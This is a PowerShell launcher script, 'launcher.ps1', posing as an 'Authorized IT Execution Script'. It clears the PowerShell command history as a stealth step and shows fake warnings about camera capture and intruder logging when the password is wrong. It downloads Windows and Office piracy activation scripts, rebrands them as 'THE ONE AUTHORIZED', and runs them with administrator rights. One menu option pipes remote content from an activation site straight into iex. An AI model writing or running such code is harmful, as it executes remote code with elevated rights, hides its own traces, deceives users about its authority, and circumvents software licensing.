# launcher.ps1
# Authorized IT Execution Script

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- STEALTH MODULE: Clear Command History ---
Clear-History
try {
    $psHistoryPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($psHistoryPath -and (Test-Path $psHistoryPath)) { 
        Clear-Content -Path $psHistoryPath -ErrorAction SilentlyContinue 
    }
} catch {}
# ---------------------------------------------

# [FIXED] Safely fetch local IP
try {
    $localIp = [System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1 | Select-Object -ExpandProperty IPAddressToString
    if (-not $localIp) { $localIp = "Unknown" }
} catch {
    $localIp = "Unknown"
}

# [NEW] Safely fetch the real physical MAC Address of the active network adapter
try {
    $macAddress = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
    if (-not $macAddress) { $macAddress = "UNKNOWN-MAC" }
} catch {
    $macAddress = "UNAVAILABLE"
}

# INVISIBLE PASSWORD PROMPT (User sees nothing)
$password = Read-Host "key" -AsSecureString

$passString = ""
if ($password -ne $null -and $password.Length -gt 0) {
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
    $passString = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
}

if ($passString -ne "8888") {
    Write-Host "`n[!] CRITICAL SECURITY BREACH DETECTED" -ForegroundColor Red
    Write-Host "[!] CAMERA SCREENSHOT INTERCEPTED & SAVED" -ForegroundColor Red
    Write-Host "[!] INTRUDER IP: $localIp / LOGGED TO SYSTEM" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

try {
    $publicIp = Invoke-RestMethod -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 3 -ErrorAction SilentlyContinue
} catch {
    $publicIp = "Offline / Detected"
}

# ---------------------------------------------------------
# MINIMA MODERN UI DISPLAY
# ---------------------------------------------------------
Clear-Host
Write-Host ""
Write-Host "  T H E   O N E   S Y S T E M S" -ForegroundColor Cyan
Write-Host "  Authorized Operations Terminal" -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Network Identity: " -NoNewline -ForegroundColor Gray
Write-Host "[!] ACTIVE TRACE LOGGING ENABLED" -ForegroundColor Red
Write-Host "  MAC Address: " -NoNewline -ForegroundColor DarkGray; Write-Host "$macAddress" -ForegroundColor DarkCyan
Write-Host "  Local IP   : " -NoNewline -ForegroundColor DarkGray; Write-Host "$localIp" -ForegroundColor White
Write-Host "  Public IP  : " -NoNewline -ForegroundColor DarkGray; Write-Host "$publicIp" -ForegroundColor White
Write-Host "  Status     : " -NoNewline -ForegroundColor DarkGray; Write-Host "SECURE & RECORDED" -ForegroundColor Green
Write-Host ""
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Available Modules:" -ForegroundColor Gray
Write-Host "  [ 1 ] Install THE ONE Authorized Office" -ForegroundColor White
Write-Host "  [ 2 ] Activate THE ONE Windows Authorized" -ForegroundColor White
Write-Host "  [ 3 ] THE ONE PC optimization" -ForegroundColor White
Write-Host "  [ 4 ] BLOCKED (by ISP/DNS) - Direct Bypass" -ForegroundColor DarkCyan
Write-Host ""
Write-Host "  [ 0 ] Exit Terminal" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray

$choice = Read-Host "`n  > Select module (1/2/3/4/0)"

if ($choice -eq '4') {
    Write-Host "`n  [+] INITIALIZING DNS BYPASS PROTOCOL..." -ForegroundColor Cyan
    try {
        iex (curl.exe -s --doh-url https://1.1.1.1/dns-query https://get.activated.win | Out-String)
    } catch {
        Write-Host "`n  [-] Bypass failed. Check connection." -ForegroundColor Red
        Start-Sleep -Seconds 5
    }
    exit
} elseif ($choice -eq '3') {
    Write-Host "`n  [+] Executing storage optimization..." -ForegroundColor Cyan
    $tempDir = $env:TEMP
    $beforeSize = (Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
    
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
    
    $afterSize = (Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
    $freedSpace = [math]::Round(($beforeSize - $afterSize) / 1MB, 2)
    
    Write-Host "  [+] Task complete. Storage freed: $freedSpace MB" -ForegroundColor White
    Write-Host "  [+] Terminating session in 7 seconds..." -ForegroundColor DarkGray
    Start-Sleep -Seconds 7
    exit
} elseif ($choice -eq '0') {
    exit
} elseif ($choice -ne '1' -and $choice -ne '2') {
    Write-Host "`n  [-] Invalid module selection." -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

Write-Host "`n  [+] Fetching secure payload from source..." -ForegroundColor Cyan
$tempPath = "$env:TEMP\THE_ONE_RUN.cmd"

try {
    # Determine the correct URL based on selection
    if ($choice -eq '1') {
        $targetUrl = "https://raw.githubusercontent.com/massgrave/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Ohook_Activation_AIO.cmd"
    } elseif ($choice -eq '2') {
        $targetUrl = "https://raw.githubusercontent.com/massgrave/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/HWID_Activation.cmd"
    }

    $scriptContent = Invoke-RestMethod -Uri $targetUrl -ErrorAction Stop
    
    # 1. Adapt CMD color to Minima theme (Cyan on Black)
    $scriptContent = $scriptContent -replace 'color 07', 'color 0B'
    
    # 2. Strong Regex Replacement for the Top Title (Catches any spacing or wording before %masver%)
    $scriptContent = $scriptContent -ireplace 'title\s+.*%masver%', 'title THE ONE AUTHORIZE %masver%'
    
    # 3. Strong Replacement for Menu Items (Catches specific official texts)
    $scriptContent = $scriptContent -ireplace 'Install Ohook Office Activation', 'Install THE ONE Authorized Office'
    $scriptContent = $scriptContent -ireplace 'Uninstall Ohook', 'Uninstall THE ONE'
    $scriptContent = $scriptContent -ireplace 'Ohook Activation', 'THE ONE OFFICE AUTHORIZED'
    $scriptContent = $scriptContent -ireplace 'HWID Activation', 'THE ONE WINDOWS AUTHORIZED'
    $scriptContent = $scriptContent -ireplace 'Choose a menu option using your keyboard', 'Choose a menu. THE ONE AUTHORIZED'
    
    Set-Content -Path $tempPath -Value $scriptContent -Encoding UTF8
    Write-Host "  [+] Payload injected. Launching interface..." -ForegroundColor White
    
    Start-Process "$tempPath" -Verb RunAs -Wait
    Remove-Item -Path $tempPath -ErrorAction SilentlyContinue
    
} catch {
    Write-Host "`n  [-] Connection failed. Check network or firewall." -ForegroundColor Red
    Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor DarkGray
    Start-Sleep -Seconds 7
}
